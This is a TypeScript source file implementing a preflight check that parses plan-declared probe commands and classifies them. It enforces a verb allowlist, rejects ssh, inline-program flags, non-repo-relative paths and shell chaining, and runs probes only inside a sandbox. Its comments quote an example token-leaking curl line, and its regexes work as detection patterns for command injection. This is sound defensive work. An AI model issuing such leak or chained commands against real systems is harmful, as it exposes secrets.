/**
 * Reference implementation of preflight Check 10's parser + classifier.
 *
 * The production runtime is the bash in `plugins/soleur/skills/preflight/SKILL.md`
 * §"Check 10: Discoverability Test Execution". This TypeScript mirror exists
 * so the 8 decision states can be unit-tested without subshells, fake `curl`,
 * or live network. If the bash and TS drift, the bash wins and this file
 * is the bug.
 */

export type ExecResult = { rc: number; stdout: string };
export type Executor = (cmd: string, timeoutMs: number) => Promise<ExecResult>;

export type ClassificationResult = {
  // SKIP-DECLARED is deliberately NOT folded into SKIP: it is a verification
  // waiver a reviewer must be able to see (ADR-173 Layer 3).
  result: "PASS" | "FAIL" | "SKIP" | "SKIP-DECLARED";
  reason?: string;
};

export type ClassifyInput = {
  planPath: string;
  planBody: string;
  prBody: string;
  runner: Executor;
  timeoutMs?: number;
  /**
   * Whether the Step 10.5 bwrap sandbox can be established. Defaults to true so
   * existing callers are unaffected. When false the runtime SKIPs — it never
   * falls back to unsandboxed execution, because a skill claiming a boundary
   * that is not there is worse than one claiming none (ADR-173 Layer 1).
   */
  sandboxAvailable?: boolean;
};

// Use POSIX [:space:] equivalent (not \s) so the TS reject regex behaves
// identically to bash's [[:space:]] in C-locale. \s in JS matches Unicode
// whitespace (U+00A0, U+2028, etc.); bash [[:space:]] in C-locale does not.
// Keeping the surface narrow avoids cross-runtime drift bypasses.
const SSH_REJECT_RE = /(^|[\t\n\r \f\v/])ssh([\t\n\r \f\v]|$)/;

// Deny-by-default probe-verb allowlist — mirrors SKILL.md Step 10.4 (#7393).
//
// This REPLACED a denylist of ten credentialed CLIs, which was unbounded-negative
// by construction: it never caught indirect invocation (`bash scripts/foo.sh`
// whose body self-wraps `doppler run -c prd`), nor any future vendor CLI, nor an
// absolute-path read of a credential file by a permitted verb.
//
// Each verb has >= 2 uses in the measured 632-command corpus of declared probes.
// `dig`/`getent` are deliberately absent (zero corpus uses) — deny-by-default
// means the first author who needs one adds it in a reviewed one-line PR.
//
// EVERY ENTRY IS AN AUTHORITY GRANT. The allowlist bounds legibility and
// maintenance; it is the Step 10.5 sandbox that bounds what a verb can REACH.
export const PROBE_VERB_ALLOWLIST = [
  "curl",
  "bash",
  "sh",
  "grep",
  "rg",
  "jq",
  "python3",
  "node",
  "bun",
  "printf",
  "git",
] as const;

// An inline program makes an allowlisted runtime equivalent to `bash -c`, which
// defeats the allowlist in a single token. Rejecting `bash -c` while permitting
// `python3 -c` would be incoherent, so every runtime carries the rule.
//
// The trailing class admits the attached-value form (`python3 -cprint(1)`) and
// the `--eval=…` form; both survive dequoting as a single argv token.
const INLINE_PROGRAM_RE: Record<string, RegExp> = {
  bash: /(^|[\t\f\v ])-c([\t\f\v ]|$|[^-\t\f\v ])/,
  sh: /(^|[\t\f\v ])-c([\t\f\v ]|$|[^-\t\f\v ])/,
  python3: /(^|[\t\f\v ])(-c|-e|-p|--eval|--print)([\t\f\v =]|$|[^-\t\f\v ])/,
  node: /(^|[\t\f\v ])(-c|-e|-p|--eval|--print)([\t\f\v =]|$|[^-\t\f\v ])/,
  bun: /(^|[\t\f\v ])(-c|-e|-p|--eval|--print)([\t\f\v =]|$|[^-\t\f\v ])/,
};

// A program-position path must be repo-relative. Pure string rule, deliberately:
// a `git ls-files` oracle would interrogate the PR-HEAD index — the attacker's
// own branch — and preflight runs BEFORE merge, so "tracked" is not "reviewed".
// Keeping it pure also keeps rejectReason() synchronous and fixture-free.
const NON_REPO_RELATIVE_RE = /^\/|^\.\.\/|\/\.\.\/|\/\.\.$/;

// Placeholder text in a declaration waives nothing — mirrors deepen-plan §4.7's
// existing placeholder machinery rather than inventing a second gate.
const PLACEHOLDER_RE = /^(todo|tbd|n\/a|na|none|tktk|\.\.\.|<.*>)$/i;

// Bash resolves `"doppler"`, `\doppler` and `dopp""ler` to the same binary, but the
// word-boundary anchors above cannot see through the quote characters. Strip them
// from a COPY before matching — mirrors the `CMD_DEQ` substitution in SKILL.md
// Step 10.4. Never strip from the string that would be executed.
const dequote = (cmd: string): string => cmd.replace(/["'\\]/g, "");

// Shell-active tokens that route command output / chain commands / spawn
// subshells / expand vars. The plan author is trust-on-PR-review but the env
// scrub in SKILL.md Step 10.5 is the load-bearing mitigation — this regex
// is defense-in-depth. Note: `$` (parameter expansion) IS rejected to block
// `curl https://api.example.com/?leak=$TOKEN` even with env scrub.
//
// `\n` closes BLOCK-mode chaining only: a block scalar joins with newlines,
// which `bash -c` runs as separate statements. It contributes zero coverage to
// folded scalars — see CRED_REJECT_RE above.
const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\n|\$\{?[A-Za-z_])/;

// Return the body of EVERY `## Observability` section (each: lines after the
// heading up to the next `^## ` heading). A doc may carry several such sections
// (e.g. plan-issue-templates.md ships one per verbosity tier), which the
// schema-parity guard walks. `extractObservabilityBlock` below is the
// first-block-only view the preflight runtime consumes.
export function extractAllObservabilityBlocks(planBody: string): string[] {
  const lines = planBody.split(/\r?\n/);
  const blocks: string[] = [];
  let collected: string[] | null = null;
  for (const line of lines) {
    if (/^## Observability(?:\s|$)/.test(line)) {
      if (collected) blocks.push(collected.join("\n"));
      collected = [];
      continue;
    }
    if (collected && /^## /.test(line)) {
      blocks.push(collected.join("\n"));
      collected = null;
      continue;
    }
    if (collected) collected.push(line);
  }
  if (collected) blocks.push(collected.join("\n"));
  return blocks;
}

// First `## Observability` section body — the view the preflight runtime consumes
// (plan bodies carry a single such section). NOTE: not byte-identical to a hand-
// written first-only loop for the malformed case of two ADJACENT `## Observability`
// headings with no intervening `^## ` — the old loop merged their bodies, this
// returns only the first. That input does not occur in real plans, so preflight
// behavior is unchanged; the split-then-`[0]` shape is what the parity guard needs.
export function extractObservabilityBlock(planBody: string): string {
  return extractAllObservabilityBlocks(planBody)[0] ?? "";
}

// Horizontal whitespace, POSIX [[:space:]] minus \n (lines are already split)
// and minus \r (stripped by the split — the documented CRLF divergence from awk).
// Deliberately NOT `\s`, which matches Unicode whitespace bash does not.
const H = "[ \\t\\f\\v]";
const FOLD_HEADER_RE = new RegExp(`^${H}*command:${H}*>[-+]?${H}*(#.*)?$`);
const BLOCK_HEADER_RE = new RegExp(`^${H}*command:${H}*\\|[-+]?${H}*(#.*)?$`);
const INLINE_KEY_RE = new RegExp(`^${H}*command:${H}*(\\S.*)$`);
const BLANK_RE = new RegExp(`^${H}*$`);

const indentOf = (line: string): number =>
  (new RegExp(`^${H}*`).exec(line)?.[0] ?? "").length;

export function parseCommand(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);

  // Form A — strict YAML key (strongest signal).
  //
  // Mirrors plugins/soleur/skills/preflight/scripts/parse-form-a.awk. That file
  // is authoritative; if these drift, the awk wins and this is the bug.
  //
  // Scalar extent follows YAML indent semantics: a continuation is a non-empty
  // line indented MORE than the `command:` key, and the first line indented <=
  // the key ends the scalar. No key-name matching — a key regex both truncates
  // legitimate content (a jq object filter's `host_present:`) and leaves a
  // differential where a LESS-indented non-key line is consumed anyway, which a
  // PR reviewer reads as outside the command but the shell executes.
  let mode: "fold" | "block" | null = null;
  let keyIndent = 0;
  const scalarLines: string[] = [];
  for (const line of lines) {
    if (mode === null) {
      // Fold/block headers MUST be tested before the inline rule: the inline
      // pattern also matches `command: >-` and would return the literal
      // indicator, which then self-rejects as a shell-active token (#6772).
      if (FOLD_HEADER_RE.test(line)) {
        mode = "fold";
        keyIndent = indentOf(line);
        continue;
      }
      if (BLOCK_HEADER_RE.test(line)) {
        mode = "block";
        keyIndent = indentOf(line);
        continue;
      }
      const inlineKey = line.match(INLINE_KEY_RE);
      if (inlineKey) return stripQuotes(inlineKey[1].trim());
      continue;
    }
    // Blank lines are legal inside a scalar and carry no indentation, so this
    // MUST precede the terminator or indentOf("") === 0 would end every scalar
    // at its first blank line. The awk drops them; this mirrors that (it used
    // to push "" and emit a spurious empty line).
    if (BLANK_RE.test(line)) continue;
    if (indentOf(line) <= keyIndent) break;
    scalarLines.push(line.replace(new RegExp(`^${H}+`), ""));
  }
  if (scalarLines.length > 0) {
    return scalarLines.join(mode === "fold" ? " " : "\n");
  }

  // Form B — prose `discoverability_test` marker + first fenced code block.
  let sawMarker = false;
  let inFence = false;
  const fenceLines: string[] = [];
  for (const line of lines) {
    if (!sawMarker && /discoverability_test/.test(line)) {
      sawMarker = true;
      continue;
    }
    if (!sawMarker) continue;
    if (/^\s*```/.test(line)) {
      if (!inFence) {
        inFence = true;
        continue;
      }
      break;
    }
    if (inFence) {
      if (/^\s*#/.test(line)) continue;
      fenceLines.push(line);
    }
  }
  return fenceLines.join("\n").trim();
}

export function parseExpected(observabilityBlock: string): string {
  const lines = observabilityBlock.split(/\r?\n/);
  for (const line of lines) {
    const yamlKey = line.match(/^\s*expected_output:\s*(.+)$/);
    if (yamlKey) return stripQuotes(yamlKey[1].trim());
  }
  // Prose form accepts bold-wrapped (`**Expected output:**`) since markdown
  // plans frequently bold the inline label. Both `Expected output:` and
  // `**Expected output:**` produce the same captured value.
  for (const line of lines) {
    const prose = line.match(/^\s*(?:\*\*)?Expected output:(?:\*\*)?\s*(.+)$/i);
    if (prose) return stripQuotes(prose[1].trim());
  }
  return "";
}

/**
 * Read the optional `credentials_required` sub-field of `discoverability_test`.
 *
 * Mirrors SKILL.md Step 10.4's flat sub-field `awk`, exactly as `expected_output`
 * already is. `parse-form-a.awk` is deliberately NOT extended — it is pinned
 * byte-exactly against this file by the P1/P2/P3 parity harness, so widening it
 * would put a schema addition through a byte-parity gate for no benefit. The flat
 * read inherits `expected_output`'s pre-existing limitation (two
 * `discoverability_test` sub-blocks could confuse it); unchanged here.
 */
export function parseCredentialsRequired(observabilityBlock: string): string {
  for (const line of observabilityBlock.split(/\r?\n/)) {
    const m = line.match(/^\s*credentials_required:\s*(.+)$/);
    if (m) return stripQuotes(m[1].trim());
  }
  return "";
}

export function matchExpected(expected: string, actualStdout: string): boolean {
  const normalized = actualStdout.replace(/\n+$/, "").trim();
  if (normalized === "") return false;
  const tokens = tokenizeExpected(expected);
  return tokens.some((tok) => {
    if (tok === "") return false;
    // Short tokens (≤ 2 chars) match only when stdout is exactly the token —
    // prevents `expected_output: "0"` matching every HTTP error response that
    // happens to contain a `0` digit (500, 404, 200, 302, etc.).
    if (tok.length <= 2) return normalized === tok;
    return normalized.includes(tok);
  });
}

export function tokenizeExpected(expected: string): string[] {
  return expected
    .split(/,|\s+or\s+|\bor\b|[`"'\[\]/]+/i)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * The effective verb: the first whitespace-delimited token of the DEQUOTED
 * command. Bash resolves `"doppler"`, `\doppler` and `dopp""ler` to the same
 * binary, so quoting must not launder the verb past the allowlist.
 */
export function effectiveVerb(cmd: string): string {
  return dequote(cmd).trimStart().split(/[\t\n\r \f\v]/)[0] ?? "";
}

/**
 * The program-position tokens: the verb itself, plus — for `bash`/`sh` — the
 * first non-flag argument, which is the script being run.
 *
 * Deliberately NOT every token: `curl … -o /dev/null` is the dominant corpus
 * form, and a rule over all tokens would reject it.
 */
function programPath(cmd: string): string {
  const verb = effectiveVerb(cmd);
  if (verb !== "bash" && verb !== "sh") return verb;
  const argv = dequote(cmd).trim().split(/[\t\n\r \f\v]+/);
  for (const tok of argv.slice(1)) {
    if (tok.startsWith("-")) continue;
    return tok;
  }
  return verb;
}

export function rejectReason(cmd: string): string | null {
  if (SSH_REJECT_RE.test(cmd)) {
    return "discoverability_test.command contains ssh (rule violation per hr-observability-as-plan-quality-gate)";
  }

  // Ordered to mirror the runtime: Step 10.4's verb/arg/path gates run before
  // Step 10.5's shell-active-token reject.
  const verb = effectiveVerb(cmd);
  const deq = dequote(cmd).trim();

  if (deq !== "" && !verb.includes("/")) {
    if (!(PROBE_VERB_ALLOWLIST as readonly string[]).includes(verb)) {
      return `discoverability_test.command starts with \`${verb}\`, which is not on the probe-verb allowlist (${PROBE_VERB_ALLOWLIST.join(" ")}). Either wrap the probe in a repo-relative script under the repository (\`bash scripts/<name>.sh …\`), or — if the probe genuinely cannot be run without credentials — declare \`credentials_required\` on the discoverability_test block so Check 10 skips it explicitly. To permit a new verb for everyone, add it to PROBE_VERB_ALLOWLIST in a reviewed PR; every entry is an authority grant.`;
    }
  }

  const inlineRe = INLINE_PROGRAM_RE[verb];
  if (inlineRe && inlineRe.test(deq.slice(verb.length))) {
    return `discoverability_test.command passes an inline program to \`${verb}\` (-c/-e/-p/--eval/--print). An inline program makes the allowlisted runtime equivalent to \`bash -c\`, which defeats the verb allowlist in a single token. Move the program into a repo-relative script.`;
  }

  const prog = programPath(cmd);
  if (NON_REPO_RELATIVE_RE.test(prog)) {
    return `discoverability_test.command runs \`${prog}\`, which is not repo-relative. A probe's program must live inside the repository (no leading \`/\`, no \`..\` segment) so it is visible in the same PR diff as the plan that declares it.`;
  }

  if (SUBST_REJECT_RE.test(cmd)) {
    return "discoverability_test.command contains shell-active token (;, &&, ||, |, >, <, &, $var, $(, `, <(, >() — refusing to run. Plans must compose single-statement commands without chaining or substitution.";
  }
  return null;
}

export async function classifyDiscoverabilityResult(
  input: ClassifyInput,
): Promise<ClassificationResult> {
  const {
    planPath,
    planBody,
    runner,
    timeoutMs = 15_000,
    sandboxAvailable = true,
  } = input;

  if (!planPath || planBody === "") {
    return {
      result: "SKIP",
      reason:
        "no plan file linked from PR body — Check 10 deferred to next preflight run after PR has a plan link",
    };
  }

  const block = extractObservabilityBlock(planBody);
  if (block === "") {
    return {
      result: "FAIL",
      reason: `plan ${planPath} is missing the ## Observability block (sensitive-path diff requires one per hr-observability-as-plan-quality-gate)`,
    };
  }

  const cmd = parseCommand(block);
  if (cmd === "") {
    return {
      result: "FAIL",
      reason: `plan ${planPath} declares an Observability block but no discoverability_test.command could be parsed (see plan-issue-templates.md §Observability for the canonical YAML schema)`,
    };
  }

  // Evaluation order mirrors the runtime:
  //   ssh reject -> credentials_required -> verb/arg/path gates ->
  //   shell-active reject -> sandbox availability -> sandboxed execute.
  //
  // `ssh` stays first and is NOT overridable by a declaration:
  // hr-observability-as-plan-quality-gate mandates a no-SSH probe unconditionally.
  if (SSH_REJECT_RE.test(cmd)) {
    return {
      result: "FAIL",
      reason:
        "discoverability_test.command contains ssh (rule violation per hr-observability-as-plan-quality-gate). A credentials_required declaration does NOT override this.",
    };
  }

  const credsRequired = parseCredentialsRequired(block);
  if (credsRequired !== "") {
    if (PLACEHOLDER_RE.test(credsRequired)) {
      return {
        result: "FAIL",
        reason: `discoverability_test.credentials_required is a placeholder ("${credsRequired}"). State the credential scope and why no unauthenticated probe verifies the same property, or remove the field.`,
      };
    }
    return {
      result: "SKIP-DECLARED",
      reason: `discoverability_test declares credentials_required — ${credsRequired}. Check 10 did NOT execute the command: running it inside the Step 10.5 sandbox would fail for lack of credentials and prove nothing about the property under test.`,
    };
  }

  const rejected = rejectReason(cmd);
  if (rejected !== null) return { result: "FAIL", reason: rejected };

  // Fail-closed: no unsandboxed fallback, ever. A skill that claims a boundary
  // it does not have is worse than one that claims none.
  if (!sandboxAvailable) {
    return {
      result: "SKIP",
      reason:
        "Check 10 executes plan-declared commands only inside a bubblewrap (bwrap) sandbox, and the sandbox could not be established on this host (bwrap absent, or unprivileged user namespaces restricted). Refusing to run the probe unsandboxed.",
    };
  }

  const expected = parseExpected(block);
  const result = await runner(cmd, timeoutMs);

  if (result.rc === 6) {
    return {
      result: "FAIL",
      reason: `command failed DNS resolution (curl rc=6 — hostname did not resolve). Verify the hostname in plan ${planPath}'s discoverability_test.command.`,
    };
  }

  if (result.rc === 28 || result.rc === 124) {
    return {
      result: "FAIL",
      reason: `command timed out after ${timeoutMs} ms (rc=${result.rc}). Either the endpoint is unreachable or the command lacks --max-time.`,
    };
  }

  if (result.rc === 22 && /401|403/.test(result.stdout)) {
    const tokens = tokenizeExpected(expected);
    const listsAuth = tokens.some((t) => /401|403/.test(t));
    if (!listsAuth) {
      return {
        result: "SKIP",
        reason: `auth-gated probe returned ${result.stdout.trim()} but expected_output does not list 401/403. Add the auth shape to expected_output OR provision Doppler creds for the probe variant.`,
      };
    }
  }

  if (!matchExpected(expected, result.stdout)) {
    return {
      result: "FAIL",
      reason: `stdout mismatch: command returned ${JSON.stringify(result.stdout.trim())}, expected_output was ${JSON.stringify(expected)} (rc=${result.rc}). Plan's expectation has drifted from production reality.`,
    };
  }

  return { result: "PASS" };
}

function stripQuotes(value: string): string {
  return value.replace(/^["'](.*)["']$/, "$1");
}
